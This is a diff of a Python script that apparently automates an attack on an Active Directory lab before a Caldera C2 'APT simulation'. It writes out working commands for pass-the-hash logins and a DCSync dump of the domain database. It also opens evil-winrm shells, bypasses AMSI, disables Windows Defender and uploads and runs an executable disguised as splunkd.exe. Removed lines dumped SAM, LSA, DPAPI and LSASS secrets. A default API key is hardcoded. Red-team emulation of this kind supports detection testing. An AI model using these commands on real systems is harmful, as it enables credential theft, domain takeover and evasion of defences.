@@ -32,7 +32,7 @@ from colorama import Fore, Style, init
 from requests import Session
 
 # Global config
-BYPASS_WAIT = True
+BYPASS_WAIT = False
 CALDERA_URL = "http://127.0.0.1:8888"
 API_KEY = "ADMIN123"  # ! Default Caldera API key
 
@@ -68,7 +68,7 @@ def run_command(command: str) -> Tuple[bool, str]:
         time.sleep(sleep_time)
 
     # Truncate command for display if too long
-    display_cmd = command if len(command) <= 100 else command[:97] + "..."
+    display_cmd = command
     log(f"{Fore.BLUE}🔧 [→] Executing: {Style.BRIGHT}{display_cmd}{Style.RESET_ALL}")
 
     start_time = time.time()
@@ -183,7 +183,7 @@ log(f"{Fore.CYAN}👑 Authenticating as Domain Admin: cersei.lannister{Style.RES
 log(f"{Fore.CYAN}🎯 Objective: Extract entire AD database (NTDS.dit){Style.RESET_ALL}\n")
 run_command(f"nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}'")
 log(f"\n{Fore.CYAN}💾 Executing DCSync to dump all domain credentials...{Style.RESET_ALL}\n")
-dcsync_output = run_command(f"yes | nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}' --ntds")
+dcsync_output = run_command(f"yes | nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}' --ntds Administrator")
 
 # Extract "Administrator:500:<hash>:<hash>:::"
 log(f"\n{Fore.CYAN}🔍 Parsing DCSync output for Administrator hash...{Style.RESET_ALL}")
@@ -199,19 +199,6 @@ else:
 print_step_header(9, "Post-Exploitation - Credential Harvesting")
 log(f"{Fore.CYAN}🔐 Authenticating as Administrator...{Style.RESET_ALL}\n")
 run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}'")
-
-log(f"\n{Fore.CYAN}💎 Dumping local credential stores...{Style.RESET_ALL}")
-log(f"{Fore.CYAN}   └─ SAM Database (Local Users){Style.RESET_ALL}")
-log(f"{Fore.CYAN}   └─ LSA Secrets (Service Accounts){Style.RESET_ALL}")
-log(f"{Fore.CYAN}   └─ DPAPI Master Keys{Style.RESET_ALL}\n")
-run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' --sam --lsa --dpapi nosystem")
-
-log(f"\n{Fore.CYAN}🧬 Executing advanced exploitation modules...{Style.RESET_ALL}\n")
-log(f"{Fore.BLUE}   [1/2] NanoDump - LSASS Memory Dump{Style.RESET_ALL}")
-run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' -M nanodump")
-
-log(f"\n{Fore.BLUE}   [2/2] Registry Winlogon - Autologon Credentials{Style.RESET_ALL}")
-run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' -M reg-winlogon")
 
 log(f"\n{Fore.CYAN}🖥️  Testing interactive shell access via Evil-WinRM...{Style.RESET_ALL}\n")
 run_command(f"echo -e 'whoami\nexit' | evil-winrm -i 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' || return 0")
@@ -231,7 +218,8 @@ log(f"{Fore.CYAN}   └─ Disabling Windows Defender{Style.RESET_ALL}")
 log(f"{Fore.CYAN}   └─ Bypassing AMSI{Style.RESET_ALL}")
 log(f"{Fore.CYAN}   └─ Uploading to: C:\\Program Files\\splunkd.exe{Style.RESET_ALL}")
 log(f"{Fore.CYAN}   └─ Spawning process via WMIC{Style.RESET_ALL}\n")
-run_command(f'echo -e \'cd "/Program Files"\\nBypass-4MSI\\nSet-MpPreference -DisableIntrusionPreventionSystem 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -EnableControlledFolderAccess Disabled;\\nupload splunkd.exe\\nwmic process call create "C:\\Program Files\\splunkd.exe"\\nStart-Sleep -Seconds 10\\nexit\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')
+run_command(f'echo -e \'cd "/Program Files"\\nBypass-4MSI\\nSet-MpPreference -DisableIntrusionPreventionSystem 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -EnableControlledFolderAccess Disabled;\\nStart-Sleep -Seconds 5\\nexit\\n\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')
+run_command(f'echo -e \'upload splunkd.exe\\nStart-Sleep -Seconds 5\\nwmic process call create "C:\\Program Files\\splunkd.exe"\\nStart-Sleep -Seconds 30\\nexit\\n\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')
 
 print_step_header(11, "Caldera C2 Operation - APT Simulation")
 log(f"{Fore.CYAN}⚙️  Initializing Caldera API connection...{Style.RESET_ALL}")
